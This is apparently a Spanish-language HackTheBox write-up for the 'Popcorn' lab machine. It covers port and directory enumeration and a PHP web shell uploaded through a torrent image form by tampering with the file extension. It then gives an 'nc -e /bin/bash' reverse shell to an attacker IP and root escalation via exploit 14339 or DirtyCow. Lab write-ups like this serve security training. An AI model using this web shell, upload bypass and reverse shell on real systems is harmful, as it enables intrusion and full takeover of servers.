---
layout: single
title: HackTheBox - Máquina Popcorn
excerpt: "Solución de la máquina Popcorn de Hack the Box."
date: 2021-04-18
classes: wide
header:
  teaser: /assets/images/htb/popcorn/popcorn.png
  teaser_home_page: true
tags:
  - Htb
  - Pentesting
  - Linux
  - Medium
---

<p align="center">
<img src="/assets/images/htb/popcorn/popcorn.png">
</p>

# Enumeración

```bash
nmap -p- --open -T5 -n -vvv 10.10.10.6 -oG allPorts
```

```bash
nmap -sC -sV -p22,80 10.10.10.6 -oN targeted
```

Y obtenemos:

```bash
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
```

# Explotación

Vamos a buscar directorios con wfuzz:

```bash
wfuzz -c -L --hc 404 --hh 177 -t 100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.6/FUZZ
```

Obtenemos el directorio `/torrent` que contiene un sitio web de torrents y la posibilidad de registrar usuarios, una vez hemos registrado un usuario y hemos accedido a la aplicación, en la URL `http://10.10.10.6/torrent/torrents.php?mode=upload` nos permite subir un archivo .torrent. Una vez subido nos da la opción de editar la información del torrent y modificar la imagen del torrent. Vamos a subir una webshell a través de esta funcionalidad.

Creación del fichero shell.php:

```php
<?php
 echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Para saltarnos la comprobación de las extensiones le cambiamos el nombre de `shell.php`a `shell.php.png`

Le damos a subir la shell pero tenemos que capturar la petición con Burpsuite para hacer tampering de la extensión:

<p align="center">
<img src="/assets/images/htb/popcorn/burpsuite.png">
</p>

Tenemos que cambiar **shell.php.png** por **shell.png** y enviar la petición, después tenemos que acceder a `<http://10.10.10.6/torrent/upload>` y abrir nuestro archivo php y mediante el parámetro cmd pasarle `?cmd=nohup nc -e /bin/bash 10.10.XX.XX 4444 &` y enviamos la petición.

En la máquina atacante tendremos la conexión establecida. (Haremos el tratamiento de la tty)

# Escalada de privilegios

En el directorio `george`vemos `home/george/.cache/motd.legal-displayed`, si hacemos una búsqueda por internet, encontramos el [exploit de github](https://www.exploit-db.com/exploits/14339)

Hacemos un `searchsploit -m 14339` (para moverlo a una carpeta) y con `xclip -sel clip` (lo copiamos al clipboard). En el directorio /tmp ó /dev/shm creamos un fichero llamado exploit.sh y pegamos el contenido, damos permisos de ejecución y lanzamos para conseguir una shell con permisos de root.

## Opcional: Dirty Cow

Se puede utilizar también [FireFart - DirtyCow](https://github.com/FireFart/dirtycow), para ello creamos un fichero `dirty.c` en `/tmp` ó `/dev/shm` y pegamos el código. Para compilarlo usamos:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

Y este es el resultado:

<p align="center">
<img src="/assets/images/htb/popcorn/dirtycow.png">
</p>

